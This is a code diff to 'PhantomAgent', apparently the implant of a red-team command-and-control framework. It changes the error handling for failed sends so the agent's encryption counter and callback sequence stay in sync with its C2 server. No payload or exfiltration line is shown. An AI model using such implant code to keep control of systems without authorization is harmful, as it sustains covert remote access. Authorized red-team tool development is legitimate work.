@@ -64,13 +64,14 @@ impl PhantomAgent {
             &[],
         )?;
         let response = self.transport.send(&packet).await;
-        // Advance unless the server never received the packet (connection-refused).
-        // • Connection-refused (ECONNREFUSED): OS rejected before TCP connect; server
-        //   CTR/seq is unchanged.  Advancing here permanently desynchs (red-cell-c2-1fhji).
-        // • All other failures (TCP-reset, timeout, lost response): the server already
+        // Advance unless this is a pre-connect failure (server never received the packet).
+        // • Pre-connect (ECONNREFUSED, DNS failure, connect timeout, TLS handshake):
+        //   packet never left the client; server CTR/seq unchanged.  Advancing here
+        //   permanently desynchs (red-cell-c2-1fhji, red-cell-c2-bviim).
+        // • All other failures (TCP-reset, lost response, read timeout): server already
         //   consumed the packet and advanced its CTR; we MUST advance to stay in sync
         //   (red-cell-c2-n4kr4).
-        if !matches!(&response, Err(PhantomError::ConnectionRefused(_))) {
+        if !matches!(&response, Err(PhantomError::PreConnectFailure(_))) {
             self.ctr_offset += callback_ctr_blocks(u32::from(DemonCommand::CommandCheckin), 0);
             self.callback_seq += 1;
         }
@@ -97,9 +98,9 @@ impl PhantomAgent {
                     &payload,
                 )?;
                 let send_result = self.send_packet(packet).await;
-                // Advance unless connection-refused (server never processed the packet).
+                // Advance unless this is a pre-connect failure (server never processed the packet).
                 // See COMMAND_CHECKIN advance above for the full rationale.
-                if !matches!(&send_result, Err(PhantomError::ConnectionRefused(_))) {
+                if !matches!(&send_result, Err(PhantomError::PreConnectFailure(_))) {
                     self.ctr_offset += callback_ctr_blocks(callback.command_id(), payload.len());
                     self.callback_seq += 1;
                 }
@@ -233,9 +234,9 @@ impl PhantomAgent {
                 &payload,
             )?;
             let send_result = self.send_packet(packet).await;
-            // Advance unless connection-refused (server never processed the packet).
+            // Advance unless this is a pre-connect failure (server never processed the packet).
             // See COMMAND_CHECKIN advance in checkin() for the full rationale.
-            if !matches!(&send_result, Err(PhantomError::ConnectionRefused(_))) {
+            if !matches!(&send_result, Err(PhantomError::PreConnectFailure(_))) {
                 self.ctr_offset += callback_ctr_blocks(callbacks[idx].command_id(), payload.len());
                 self.callback_seq += 1;
             }
